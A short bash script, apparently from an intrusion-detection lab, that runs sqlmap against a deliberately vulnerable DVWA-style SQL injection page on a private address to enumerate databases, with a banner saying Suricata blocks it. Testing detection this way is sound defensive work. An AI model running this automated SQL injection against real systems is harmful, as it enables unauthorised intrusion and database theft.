#!/bin/bash
set -euo pipefail

TARGET="http://172.20.0.30"
COOKIE="PHPSESSID=test; security=low"

echo "=== SQLMAP - BLOQUEADO POR SURICATA =="
echo ""

ping -c 1 "172.20.0.30" >/dev/null 2>&1 || { echo "ERROR: objetivo no responde"; exit 1; }

sqlmap -u "$TARGET/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="$COOKIE" \
       --batch \
       --level=2 \
       --risk=1 \
       --dbs \
       --output-dir=/tmp/sqlmap

echo ""
echo "=== SQLMAP COMPLETADO ==="
